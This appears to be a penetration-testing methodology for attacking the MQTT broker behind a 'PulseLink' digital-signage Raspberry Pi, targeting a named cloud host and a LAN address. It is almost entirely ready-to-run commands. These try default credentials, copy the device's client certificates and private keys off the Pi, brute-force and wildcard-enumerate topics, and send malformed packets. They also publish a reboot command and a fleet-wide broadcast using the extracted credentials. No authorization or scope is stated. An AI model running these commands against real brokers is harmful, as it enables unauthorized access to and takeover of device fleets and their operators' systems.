# MQTT Protocol Enumeration Methodology
## PulseLink Pi — Broker Discovery & Interaction

**Target Broker:** pulse.n-compass.online:8883 (TLS)
**Target Pi:** 192.168.0.125
**Date:** 2026-03-17

---

## 1. Tool Check

```bash
# Check if mosquitto tools are available
which mosquitto_sub mosquitto_pub mosquitto_ctrl

# If not installed
sudo apt install mosquitto-clients -y

# Also useful: MQTT-PWN (specialized MQTT pentesting tool)
pip install mqtt-pwn
```

## 2. Unauthenticated Connection Attempts

### Try wildcard subscription without TLS (port 1883 — unlikely but test)
```bash
mosquitto_sub -h 192.168.0.125 -p 1883 -t "#" -v -C 10
mosquitto_sub -h 192.168.0.125 -p 1883 -t "\$" -v -C 10
```

### Try the cloud broker without auth (port 8883 with TLS but no client cert)
```bash
# This will likely fail with TLS error, but reveals if anonymous access is allowed
mosquitto_sub -h pulse.n-compass.online -p 8883 \
  --tls-version tlsv1.2 \
  -t "#" -v -C 10 \
  --debug
```

### Try common default credentials
```bash
# Default: admin/admin, admin/password, pulslink/pulselink
mosquitto_sub -h pulse.n-compass.online -p 8883 \
  -u admin -P admin \
  -t "#" -v -C 10

mosquitto_sub -h pulse.n-compass.online -p 8883 \
  -u pulslink -P pulslink \
  -t "#" -v -C 10
```

## 3. TLS-Authenticated Connection

### Using the Pi's client certificate (if accessible)
```bash
# Full TLS connection with client certificate
mosquitto_sub -h pulse.n-compass.online -p 8883 \
  --cafile /opt/pulselink/client_certs/ca.crt \
  --cert /opt/pulselink/client_certs/client_pi_generic.crt \
  --key /opt/pulselink/client_certs/client_pi_generic.key \
  -t "#" -v -C 10 \
  --debug
```

### If certs are on the Pi, extract them first
```bash
# SSH into the Pi and copy certs
ssh pi@192.168.0.125
sudo ls -la /opt/pulselink/client_certs/
# Copy to your Kali machine
scp pi@192.168.0.125:/opt/pulselink/client_certs/* ./certs/
```

### Try with only CA cert (no client cert — tests if mutual TLS is required)
```bash
mosquitto_sub -h pulse.n-compass.online -p 8883 \
  --cafile ./certs/ca.crt \
  -t "#" -v -C 10 \
  --debug
```

## 4. TLS Connection Inspection

### Basic TLS handshake
```bash
openssl s_client -connect pulse.n-compass.online:8883 \
  -servername pulse.n-compass.online \
  -showcerts
```

### TLS with client certificate
```bash
openssl s_client -connect pulse.n-compass.online:8883 \
  -servername pulse.n-compass.online \
  -cert ./certs/client_pi_generic.crt \
  -key ./certs/client_pi_generic.key \
  -CAfile ./certs/ca.crt \
  -showcerts
```

### Check TLS version support
```bash
# Try TLS 1.0 (likely rejected)
openssl s_client -connect pulse.n-compass.online:8883 -tls1

# Try TLS 1.1 (likely rejected)
openssl s_client -connect pulse.n-compass.online:8883 -tls1_1

# Try TLS 1.2 (expected to work)
openssl s_client -connect pulse.n-compass.online:8883 -tls1_2

# Try TLS 1.3 (if supported)
openssl s_client -connect pulse.n-compass.online:8883 -tls1_3
```

### Extract server certificate details
```bash
echo | openssl s_client -connect pulse.n-compass.online:8883 2>/dev/null | \
  openssl x509 -text -noout | grep -E "Subject:|Issuer:|Not Before|Not After|DNS:|IP Address:"
```

## 5. MQTT Topic Enumeration

### Method 1: Wildcard subscription (if authorized)
```bash
# Multi-level wildcard — catches everything
mosquitto_sub -h pulse.n-compass.online -p 8883 \
  --cafile ./certs/ca.crt \
  --cert ./certs/client_pi_generic.crt \
  --key ./certs/client_pi_generic.key \
  -t "#" -v -C 50

# Single-level wildcard — step through topic tree
mosquitto_sub -h pulse.n-compass.online -p 8883 \
  --cafile ./certs/ca.crt \
  --cert ./certs/client_pi_generic.crt \
  --key ./certs/client_pi_generic.key \
  -t "+/+" -v -C 20
```

### Method 2: System topics ($SYS)
```bash
# Broker system topics — may reveal broker info, connected clients
mosquitto_sub -h pulse.n-compass.online -p 8883 \
  --cafile ./certs/ca.crt \
  --cert ./certs/client_pi_generic.crt \
  --key ./certs/client_pi_generic.key \
  -t "\$SYS/#" -v -C 30
```

### Method 3: Common digital signage topic patterns
```bash
# Try common patterns one by one
for topic in \
  "device/status" \
  "device/command" \
  "device/content" \
  "fleet/broadcast" \
  "fleet/+/content" \
  "heartbeat" \
  "status" \
  "commands" \
  "config" \
  "update" \
  "telemetry" \
  "pulselink/#" \
  "nctv/#"; do
  echo "=== Testing: $topic ==="
  mosquitto_sub -h pulse.n-compass.online -p 8883 \
    --cafile ./certs/ca.crt \
    --cert ./certs/client_pi_generic.crt \
    --key ./certs/client_pi_generic.key \
    -t "$topic" -C 1 -W 5 2>&1 | head -5
done
```

### Method 4: Brute-force topic enumeration
```bash
# Using wordlist of common IoT topics
cat << 'EOF' > /tmp/mqtt_topics.txt
device
devices
status
heartbeat
command
commands
config
configuration
control
content
media
update
updates
telemetry
sensor
sensors
data
image
video
stream
player
player/status
player/command
player/content
nctv
pulselink
fleet
broadcast
alive
online
offline
EOF

while read topic; do
  mosquitto_sub -h pulse.n-compass.online -p 8883 \
    --cafile ./certs/ca.crt \
    --cert ./certs/client_pi_generic.crt \
    --key ./certs/client_pi_generic.key \
    -t "$topic" -C 1 -W 3 2>/dev/null && echo "[+] Found: $topic"
done < /tmp/mqtt_topics.txt
```

## 6. MQTT Broker Version Detection

### Method 1: TLS ServerHello analysis
```bash
# Extract server certificate — may reveal broker software
echo | openssl s_client -connect pulse.n-compass.online:8883 2>/dev/null | \
  grep -E "Server|subject|issuer"
```

### Method 2: CONNECT packet analysis
```bash
# Capture CONNECT packet — client ID may reveal broker version
sudo tcpdump -i wlan0 -n "tcp port 8883 and tcp[((tcp[12:1] & 0xf0) >> 2):1] = 0x10" \
  -w /tmp/mqtt_connect.pcap -c 5
```

### Method 3: MQTT 5.0 properties probe
```bash
# Try MQTT 5.0 connection (modern brokers support this)
mosquitto_sub -h pulse.n-compass.online -p 8883 \
  --cafile ./certs/ca.crt \
  --mqtt-version 5 \
  -t "#" -v -C 1 \
  --debug 2>&1 | grep -i "protocol\|version\|reason"
```

### Method 4: Protocol error probing
```bash
# Send malformed packet and analyze response
python3 -c "
import socket, ssl
context = ssl.create_default_context()
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ssock = context.wrap_socket(sock, server_hostname='pulse.n-compass.online')
ssock.connect(('pulse.n-compass.online', 8883))
# Send CONNECT with wrong protocol version
ssock.send(b'\x10\x00\x00\x04MQTT\x04\x00\x00\x00\x00\x00')
print(ssock.recv(1024).hex())
ssock.close()
"
```

## 7. Message Publishing (Attack Vector)

### If authenticated, test publishing capabilities
```bash
# Publish test message to device command topic
mosquitto_pub -h pulse.n-compass.online -p 8883 \
  --cafile ./certs/ca.crt \
  --cert ./certs/client_pi_generic.crt \
  --key ./certs/client_pi_generic.key \
  -t "device/$(hostname)/command" \
  -m '{"action":"reboot"}'

# Publish to fleet broadcast
mosquitto_pub -h pulse.n-compass.online -p 8883 \
  --cafile ./certs/ca.crt \
  --cert ./certs/client_pi_generic.crt \
  --key ./certs/client_pi_generic.key \
  -t "fleet/broadcast" \
  -m '{"type":"test","message":"enumeration test"}'
```

## 8. Using MQTT-PWN (Specialized Tool)

```bash
# Interactive MQTT security testing
mqtt-pwn

# Inside MQTT-PWN console:
# connect -H pulse.n-compass.online -p 8883 --tls
# broker-info
# topic-listener
# topic-scanner
```

## 9. Key Findings to Document

| Finding | Detail |
|---------|--------|
| Anonymous access allowed? | Yes/No |
| TLS version | TLS 1.2 / 1.3 |
| Client cert required? | Yes/No |
| Broker software | EMQX / Mosquitto / HiveMQ / Custom |
| Active topics discovered | List them |
| Message content | What data flows through |
| Publish permissions | Can we write? |
